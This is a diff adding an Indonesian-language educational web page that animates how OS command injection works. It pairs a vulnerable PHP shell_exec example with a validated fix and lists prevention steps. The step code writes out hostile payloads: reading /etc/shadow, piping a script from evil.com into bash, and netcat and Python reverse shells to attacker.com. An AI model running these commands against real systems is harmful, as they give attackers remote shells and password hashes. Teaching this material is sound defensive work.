@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Command Injection — Animasi | CYBERSHIELD 2026</title><link rel="stylesheet" href="shared.css"></head>
+<body>
+<div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
+<div class="page">
+    <div class="anim-header">
+        <div class="anim-badge" style="background:rgba(239,68,68,0.15);color:#ef4444;border:1px solid rgba(239,68,68,0.3);">⌨️ OS COMMAND INJECTION</div>
+        <h1>Cara Kerja <span>Command Injection</span></h1>
+        <p>Input user dimasukkan ke perintah OS — karakter ; | && ` digunakan untuk chaining command berbahaya.</p>
+        <div class="nav-links"><a href="xss_dom.html" class="nav-link">← DOM XSS</a><a href="index.html" class="nav-link">🏠 Semua Animasi</a><a href="lfi.html" class="nav-link">LFI →</a></div>
+    </div>
+    <div class="anim-container">
+        <div class="anim-viewport">
+            <div class="flow" id="flow">
+                <div class="flow-step" data-step="0"><div class="step-num">1</div><div class="step-content"><div class="step-label">🔍 Menemukan fitur network tool</div><div class="step-desc">Ping tool, DNS lookup, traceroute, whois — fitur yang memanggil command OS di backend.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="1"><div class="step-num">2</div><div class="step-content"><div class="step-label">💉 Menyisipkan command separator</div><div class="step-desc">Menambahkan perintah tambahan setelah input normal:</div><div class="step-code">domain=google.com<span class="bad">; cat /etc/shadow</span><br>domain=x<span class="bad"> | nc attacker.com 4444 -e /bin/sh</span><br>domain=<span class="bad">$(curl evil.com/backdoor.sh|bash)</span></div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="2"><div class="step-num">3</div><div class="step-content"><div class="step-label">⚙️ Server mengeksekusi command chain</div><div class="step-desc"><code>nslookup google.com; cat /etc/shadow</code> → KEDUA perintah dijalankan. OS memperlakukan ; sebagai pemisah command.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="3"><div class="step-num">4</div><div class="step-content"><div class="step-label">📡 Output perintah dikembalikan</div><div class="step-desc">Hasil dari <code>cat /etc/shadow</code> (password hash) ditampilkan di halaman bersama hasil nslookup.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="4"><div class="step-num">5</div><div class="step-content"><div class="step-label">🐚 Eskalasi ke reverse shell</div><div class="step-desc">Penyerang membuat koneksi shell interaktif:</div><div class="step-code"><span class="bad">; python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno())'</span></div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="5"><div class="step-num">6</div><div class="step-content"><div class="step-label">💥 Server takeover complete</div><div class="step-desc">Penyerang memiliki shell interaktif. Baca semua file, install backdoor, pivot ke server lain, deploy ransomware.</div></div></div>
+            </div>
+        </div>
+        <div class="anim-controls"><button class="ctrl-btn" id="prevBtn" onclick="prevStep()" disabled>← Prev</button><span class="step-indicator" id="stepIndicator">1 / 6</span><button class="ctrl-btn primary" id="nextBtn" onclick="nextStep()">Next →</button><button class="ctrl-btn" id="autoBtn" onclick="autoPlay()">▶ Auto</button></div>
+    </div>
+    <div class="code-compare">
+        <div class="code-box"><div class="code-label vuln">⚠️ RENTAN</div><div class="code-body">$domain = $_POST['domain'];
+$result = shell_exec("nslookup $domain");
+// domain=google.com; cat /etc/shadow
+// domain=x | reverse_shell</div></div>
+        <div class="code-box"><div class="code-label safe">✅ AMAN</div><div class="code-body">$domain = $_POST['domain'];
+if (!preg_match('/^[a-zA-Z0-9.\-]+$/', $domain))
+  die("Domain tidak valid");
+// Lebih baik: gunakan PHP native
+$records = dns_get_record($domain);
+// Tidak perlu shell_exec!</div></div>
+    </div>
+    <div class="info-grid">
+        <div class="info-card danger"><h3>💀 Dampak</h3><ul><li>Full server access via reverse shell</li><li>Data exfiltration</li><li>Ransomware deployment</li><li>Lateral movement ke jaringan</li></ul></div>
+        <div class="info-card success"><h3>🛡️ Pencegahan</h3><ul><li>Gunakan native language functions</li><li>Regex whitelist untuk input</li><li>escapeshellarg() jika harus shell</li><li>Run service sebagai non-root user</li></ul></div>
+    </div>
+    <div class="anim-disclaimer">⚠️ <strong>EDUKASI ONLY</strong></div>
+</div>
+<script>let current=-1;const total=6;const steps=document.querySelectorAll('.flow-step');function updateSteps(){steps.forEach((s,i)=>{s.classList.remove('active','done');if(i<current)s.classList.add('done');else if(i===current)s.classList.add('active');});document.getElementById('stepIndicator').textContent=`${current+1} / ${total}`;document.getElementById('prevBtn').disabled=current<=0;document.getElementById('nextBtn').disabled=current>=total-1;}function nextStep(){if(current<total-1){current++;updateSteps();}}function prevStep(){if(current>0){current--;updateSteps();}}function autoPlay(){current=-1;updateSteps();let i=0;const iv=setInterval(()=>{if(i>=total){clearInterval(iv);return;}current=i++;updateSteps();},1200);}nextStep();</script>
+</body></html>
